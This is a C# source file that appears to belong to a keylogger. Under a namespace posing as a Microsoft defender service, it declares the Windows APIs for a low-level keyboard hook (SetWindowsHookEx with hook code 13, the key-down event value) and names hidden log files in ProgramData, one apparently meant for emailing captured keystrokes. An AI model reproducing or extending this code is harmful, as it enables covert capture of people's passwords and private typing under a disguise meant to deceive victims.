using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace MicrosoftKeyServiceDefender
{
    public static class ServiceConstants
    {
        internal const string LogFile = @"C:\ProgramData\log.txt";
        internal const string EmailLogFile = @"C:\ProgramData\emailLog.txt";
        internal const int MaxLogLength = 300;

        internal static int LowLevelHookCode = 13;
        internal static int KeydownEvent = 0x0100;

        [DllImport("user32.dll")]
        internal static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        internal static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetModuleHandle(String lpModuleName);

        [DllImport("user32.dll")]
        internal static extern bool UnhookWindowsHookEx(IntPtr hhk);

        internal delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    }
}
